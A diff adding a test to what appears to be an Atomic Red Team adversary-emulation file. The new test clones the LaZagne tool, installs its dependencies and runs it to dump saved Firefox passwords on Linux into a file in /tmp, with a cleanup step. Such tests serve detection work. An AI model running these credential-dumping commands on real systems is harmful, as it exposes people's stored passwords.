@@ -282,3 +282,30 @@ atomic_tests:
      cat #{Out_Filepath}
     cleanup_command: |
      Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue   
+- name: LaZagne.py - Dump Credentials from Firefox Browser on Linux
+  description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser
+  supported_platforms:
+  - linux
+  input_arguments:
+    out_file:
+      description: This is where the Credentials output goes
+      type: String
+      default: /tmp/firefox_passwords.txt
+    lazagne_path:
+      description: Path you put LaZagne Github with LaZagne.py
+      type: String
+      default: /tmp/LaZagne/Linux
+  dependency_executor_name: bash
+  dependencies:
+  - description: Get Lazagne from Github
+    prereq_command: 'test -f #{lazagne_path} laZagne.py'
+    get_prereq_command: cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
+  - description: Needs git, python3 and some pip stuff
+    prereq_command: which git && which python3 && which pip
+    get_prereq_command: apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
+  executor:
+    command: 'python3 #{lazagne_path}/laZagne.py browsers -firefox >> #{out_file}'
+    cleanup_command: 'rm -R /tmp/LaZagne; rm -f #{out_file}'
+    name: bash
+    elevation_required: true
+  
